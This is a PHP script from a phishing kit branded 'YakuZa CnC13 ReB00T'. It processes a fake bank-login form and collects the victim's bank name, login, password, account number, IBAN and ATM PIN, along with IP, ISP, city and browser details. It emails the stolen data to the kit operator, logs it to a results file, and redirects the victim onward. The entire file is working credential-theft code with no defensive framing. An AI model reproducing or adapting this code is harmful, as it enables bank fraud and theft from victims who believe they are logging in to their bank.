<?php
//error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
if($_POST['bankname'] == "") {
	exit(); //Check what to do instead
}
$ip = getUserIP();
$message = "#-------------------------[💎 YakuZa CnC13 ReB00T 💎]------------------#\n";
$message .= "#-----------------------------[🏧 BANK LOGIN 🏧]-----------------------#\n";
$message .= "🏧 Nom Banque      : ".$_POST['bankname']."\n";
$message .= "🏧 Login Banque    : ".$_POST['userid']."\n";
$message .= "🏧 Mot de passe    : ".$_POST['passcode']."\n";
$message .= "🏧 Numéro Compte   : ".$_POST['accnum']."\n";
$message .= "🏧 IBAN            : ".$_POST['rnumber']."\n";
$message .= "🏧 PIN             : ".$_POST['atmpin']."\n";
$message .= "#---------------------------[💉 PC INFORMATION 💉]---------------------#\n";
$message .= "💉 Date            : ".$date."\n";
$message .= "💉 IP              : ".$ip."\n";
$message .= "💉 FAI             : ".$ispuser."\n";
//$message .= "💉 Region        : ".$regioncity."\n";
$message .= "💉 Ville           : ".$citykota."\n";
//$message .= "💉 Continent     : ".$continent."\n";
//$message .= "💉 Timezone      : ".$timezone."\n";
$message .= "💉 OS/Browser      : ".$os." / ".$br."\n";
$message .= "💉 User Agent      : ".$user_agent."\n\n";
//$message .= "#-------------------------[💎 YakuZa CnC13 ReB00T 💎]------------------#\n";

$subject = "[BANK INFO] " . $_POST['bankname'] . " | $ip | " . "$citykota | $cn | " . $_SESSION['login_email'];

kirim_mail($email_recipient, $_SESSION['login_email'], $subject, $message);
tulis_file("../result/total_bank.txt", "[$date] " . $_POST['bankname'] . " | $ip");

if($get_id == "on"){
 echo "<script type='text/javascript'>window.top.location='identity?key=$key';</script>";
}else{
 echo "<script type='text/javascript'>window.top.location='done?key=$key';</script>";
}